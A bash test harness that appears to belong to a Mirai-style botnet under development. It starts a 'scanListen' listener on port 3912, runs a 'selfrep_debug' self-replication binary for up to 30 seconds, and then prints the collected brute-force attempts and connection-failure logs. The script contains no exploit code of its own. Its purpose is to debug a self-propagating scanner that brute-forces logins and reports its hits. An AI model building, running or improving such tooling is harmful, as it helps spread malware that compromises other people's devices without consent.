#!/bin/bash

echo "🧪 Testing Complete Self-Rep System"
echo "=================================="

# Kill any existing processes
echo "🧹 Cleaning up existing processes..."
pkill -f selfrep_debug 2>/dev/null
pkill -f scanListen 2>/dev/null
sleep 2

# Start scanListen
echo "🚀 Starting scanListen..."
cd /root && go run scanListen.go > scanlisten_output.log 2>&1 &
SCANLISTEN_PID=$!
sleep 3

# Check if scanListen is running
if ! ps -p $SCANLISTEN_PID > /dev/null; then
    echo "❌ scanListen failed to start"
    exit 1
fi

echo "✅ scanListen started (PID: $SCANLISTEN_PID)"

# Check if port 3912 is listening
if ! netstat -tlnp | grep -q 3912; then
    echo "❌ scanListen is not listening on port 3912"
    exit 1
fi

echo "✅ scanListen is listening on port 3912"

# Start selfrep_debug
echo "🚀 Starting selfrep_debug..."
cd /root && rm -f /tmp/selfrep_debug.log
timeout 30s ~/release/selfrep_debug > selfrep_console.log 2>&1 &
SELFREP_PID=$!

echo "✅ selfrep_debug started (PID: $SELFREP_PID)"

# Monitor for 20 seconds
echo "⏱️  Monitoring for 20 seconds..."
for i in {1..20}; do
    echo -n "."
    sleep 1
    
    # Check if processes are still running
    if ! ps -p $SCANLISTEN_PID > /dev/null; then
        echo -e "\n❌ scanListen stopped unexpectedly"
        break
    fi
    
    if ! ps -p $SELFREP_PID > /dev/null; then
        echo -e "\n⚠️  selfrep_debug stopped (timeout or exit)"
        break
    fi
done

echo -e "\n"

# Check results
echo "📊 Checking results..."

# Check scanListen output
echo "📋 scanListen output:"
tail -10 /root/scanlisten_output.log

echo ""

# Check selfrep_debug logs
echo "📋 selfrep_debug logs:"
tail -10 /tmp/selfrep_debug.log

echo ""

# Check brute_attempts.txt
if [ -f "/root/brute_attempts.txt" ]; then
    echo "📋 brute_attempts.txt:"
    cat /root/brute_attempts.txt
else
    echo "⚠️  brute_attempts.txt not found"
fi

echo ""

# Check for connection errors
echo "🔍 Checking for connection errors:"
grep -i "Failed to connect" /root/selfrep_console.log | head -5

echo ""

# Cleanup
echo "🧹 Cleaning up..."
pkill -f selfrep_debug 2>/dev/null
pkill -f scanListen 2>/dev/null

echo "✅ Test complete!"
